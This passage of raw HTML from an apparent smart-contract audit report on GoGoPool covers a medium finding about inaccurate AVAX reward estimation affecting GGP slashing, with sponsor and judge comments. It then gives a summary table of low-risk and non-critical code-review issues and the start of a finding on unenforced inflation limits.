class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.ggpSlashAmt&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">GGPSlashed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\"> </span><span class=\"mtk12\">staking</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Staking</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Staking&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">slashGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Note the code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The slashedGGPAmt is calculated based on the AVAX reward amount.</p>\n<p>However, the estimation of the validation rewards is not accurate.</p>\n<p>According to the doc:</p>\n<p><a href=\"https://docs.avax.network/nodes/build/set-up-an-avalanche-node-with-microsoft-azure\">https://docs.avax.network/nodes/build/set-up-an-avalanche-node-with-microsoft-azure</a></p>\n<blockquote>\n<p>Running a validator and staking with Avalanche provides extremely competitive rewards of between 9.69% and 11.54% depending on the length you stake for.</p>\n</blockquote>\n<p>This implies that the staking length affect staking rewards, but this is kind of vague. What is the exact implementation of the reward calculation?</p>\n<p>The implementation is linked below:</p>\n<p><a href=\"https://github.com/ava-labs/avalanchego/blob/master/vms/platformvm/reward/calculator.go#L40\">https://github.com/ava-labs/avalanchego/blob/master/vms/platformvm/reward/calculator.go#L40</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"golang\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// Reward returns the amount of tokens to reward the staker with.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">//</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// RemainingSupply = SupplyCap - ExistingSupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// PortionOfExistingSupply = StakedAmount / ExistingSupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// PortionOfStakingDuration = StakingDuration / MaximumStakingDuration</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// MintingRate = MinMintingRate + MaxSubMinMintingRate * PortionOfStakingDuration</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// Reward = RemainingSupply * PortionOfExistingSupply * MintingRate * PortionOfStakingDuration</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">func (c *calculator) Calculate(stakedDuration time.Duration, stakedAmount, currentSupply uint64) uint64 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tbigStakedDuration := new(big.Int).SetUint64(uint64(stakedDuration))</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tbigStakedAmount := new(big.Int).SetUint64(stakedAmount)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tbigCurrentSupply := new(big.Int).SetUint64(currentSupply)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tadjustedConsumptionRateNumerator := new(big.Int).Mul(c.maxSubMinConsumptionRate, bigStakedDuration)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tadjustedMinConsumptionRateNumerator := new(big.Int).Mul(c.minConsumptionRate, c.mintingPeriod)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tadjustedConsumptionRateNumerator.Add(adjustedConsumptionRateNumerator, adjustedMinConsumptionRateNumerator)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tadjustedConsumptionRateDenominator := new(big.Int).Mul(c.mintingPeriod, consumptionRateDenominator)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tremainingSupply := c.supplyCap - currentSupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treward := new(big.Int).SetUint64(remainingSupply)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treward.Mul(reward, adjustedConsumptionRateNumerator)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treward.Mul(reward, bigStakedAmount)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treward.Mul(reward, bigStakedDuration)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treward.Div(reward, adjustedConsumptionRateDenominator)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treward.Div(reward, bigCurrentSupply)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treward.Div(reward, c.mintingPeriod)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif !reward.IsUint64() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn remainingSupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfinalReward := reward.Uint64()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif finalReward &gt; remainingSupply {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\treturn remainingSupply</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\treturn finalReward</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Note the reward calculation formula:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Reward returns the amount of tokens to reward the staker with.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// RemainingSupply = SupplyCap - ExistingSupply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// PortionOfExistingSupply = StakedAmount / ExistingSupply</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// PortionOfStakingDuration = StakingDuration / MaximumStakingDuration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// MintingRate = MinMintingRate + MaxSubMinMintingRate * PortionOfStakingDuration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Reward = RemainingSupply * PortionOfExistingSupply * MintingRate * PortionOfStakingDuration</span></span></span></code></pre>\n<p>However, in the current ExpectedRewardAVA, the implementation is just:</p>\n<p>AVAX reward rate * avax amount * duration / 365 days.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ProtocolDAO</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExpectedAVAXRewardsRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">avaxAmt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Clearly, the implementation of the avalanche side is more sophisticated and accurate than the implemented ExpectedRewardAVA.</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the project make the ExpectedRewardAVA implementation match the implement.</p>\n<p><a href=\"https://github.com/ava-labs/avalanchego/blob/master/vms/platformvm/reward/calculator.go#L40\">https://github.com/ava-labs/avalanchego/blob/master/vms/platformvm/reward/calculator.go#L40</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1398876613\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Rialto is going to report the correct rewards rate to the DAO from Avalanche. Not sure if it’s a medium.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1398893666\">emersoncloud (GoGoPool) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We felt comfortable with a static setting number because we are (initally) staking minipools for 2 week increments with 2000 AVAX, making the variability in rewards rates minimal. </p>\n<p>We will develop a more complex calculation as the protocol starts handling a wider range of funds and durations.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1414356992\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown an incorrect implementation of the formula to estimate rewards.</p>\n<p>The math would cause the slash value to be incorrect, causing improper yield to be distributed, for this reason I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/122#issuecomment-1421434941\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged. See comments above!</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 15 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/728\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/876\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/854\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/791\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/710\">betweenETHlines</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/693\">sces60107</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/565\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/508\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/392\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/338\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/260\">cozzetti</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/94\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/78\">codeislight</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/74\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/65\">RaymondFam</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<h3 id=\"low-risk-issues\" style=\"position:relative;\"><a href=\"#low-risk-issues\" aria-label=\"low risk issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Issues</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[L‑01]</td>\n<td align=\"left\">Inflation not locked for four years</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[L‑02]</td>\n<td align=\"left\">Contract will stop functioning in the year 2106</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[L‑03]</td>\n<td align=\"left\">Lower-level initializations should come first</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[L‑04]</td>\n<td align=\"left\">Incorrect percentage conversion</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[L‑05]</td>\n<td align=\"left\">Loss of precision</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[L‑06]</td>\n<td align=\"left\">Signatures vulnerable to malleability attacks</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[L‑07]</td>\n<td align=\"left\"><code>require()</code> should be used instead of <code>assert()</code></td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 8 instances over 7 issues</p>\n<h3 id=\"non-critical-issues\" style=\"position:relative;\"><a href=\"#non-critical-issues\" aria-label=\"non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-critical Issues</h3>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[N‑01]</td>\n<td align=\"left\">Common code should be refactored</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑02]</td>\n<td align=\"left\">String constants used in multiple places should be defined as constants</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑03]</td>\n<td align=\"left\">Constants in comparisons should appear on the left side</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑04]</td>\n<td align=\"left\">Inconsistent address separator in storage names</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑05]</td>\n<td align=\"left\">Confusing function name</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑06]</td>\n<td align=\"left\">Misplaced punctuation</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑07]</td>\n<td align=\"left\">Upgradeable contract is missing a <code>__gap[50]</code> storage variable to allow for new storage variables in later versions</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑08]</td>\n<td align=\"left\">Import declarations should import specific identifiers, rather than the whole file</td>\n<td align=\"center\">13</td>\n</tr>\n<tr>\n<td>[N‑09]</td>\n<td align=\"left\">Missing <code>initializer</code> modifier on constructor</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑10]</td>\n<td align=\"left\">The <code>nonReentrant</code> <code>modifier</code> should occur before all other modifiers</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑11]</td>\n<td align=\"left\"><code>override</code> function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑12]</td>\n<td align=\"left\"><code>constant</code>s should be defined rather than using magic numbers</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑13]</td>\n<td align=\"left\">Missing event and or timelock for critical parameter change</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑14]</td>\n<td align=\"left\">Events that mark critical parameter changes should contain both the old and the new value</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑15]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑16]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑17]</td>\n<td align=\"left\">Constant redefined elsewhere</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑18]</td>\n<td align=\"left\">Lines are too long</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑19]</td>\n<td align=\"left\">Variable names that consist of all capital letters should be reserved for <code>constant</code>/<code>immutable</code> variables</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑20]</td>\n<td align=\"left\">Using <code>></code>/<code>>=</code> without specifying an upper bound is unsafe</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>[N‑21]</td>\n<td align=\"left\">Typos</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td>[N‑22]</td>\n<td align=\"left\">File is missing NatSpec</td>\n<td align=\"center\">3</td>\n</tr>\n<tr>\n<td>[N‑23]</td>\n<td align=\"left\">NatSpec is incomplete</td>\n<td align=\"center\">27</td>\n</tr>\n<tr>\n<td>[N‑24]</td>\n<td align=\"left\">Not using the named return variables anywhere in the function is confusing</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑25]</td>\n<td align=\"left\">Contracts should have full test coverage</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑26]</td>\n<td align=\"left\">Large or complicated code bases should implement fuzzing tests</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>[N‑27]</td>\n<td align=\"left\">Function ordering does not follow the Solidity style guide</td>\n<td align=\"center\">15</td>\n</tr>\n<tr>\n<td>[N‑28]</td>\n<td align=\"left\">Contract does not follow the Solidity style guide’s suggested layout ordering</td>\n<td align=\"center\">9</td>\n</tr>\n<tr>\n<td>[N‑29]</td>\n<td align=\"left\">Open TODOs</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 99 instances over 29 issues</p>\n<h2 id=\"l01-inflation-not-locked-for-four-years\" style=\"position:relative;\"><a href=\"#l01-inflation-not-locked-for-four-years\" aria-label=\"l01 inflation not locked for four years permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑01] Inflation not locked for four years</h2>\n<p>The <a href=\"https://docs.gogopool.com/about-gogopool/gogopool-litepaper\">litepaper</a> says that there will be no inflation for four years, but there is no code enforcing this.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contract</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">   \t\t</span><span class=\"mtk3\">// GGP Inflation</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">   \t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO.InflationIntervalSeconds&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:  \t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO.InflationIntervalRate&quot;</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1000133680617113500</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// 5% annual calculated on a daily interval - Calculate in js example: let dailyInflation = web3.utils.toBN((1 + 0.05) ** (1 / (365)) * 1e18);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L39-L41\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/ProtocolDAO.sol#L39-L41</a></p>\n<h2 id=\"l02-contract-will-stop-functioning-in-the-year-2106\" style=\"position:relative;\"><a href=\"#l02-contract-will-stop-functioning-in-the-year-2106\" aria-label=\"l02 contract will stop functioning in the year 2106 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" 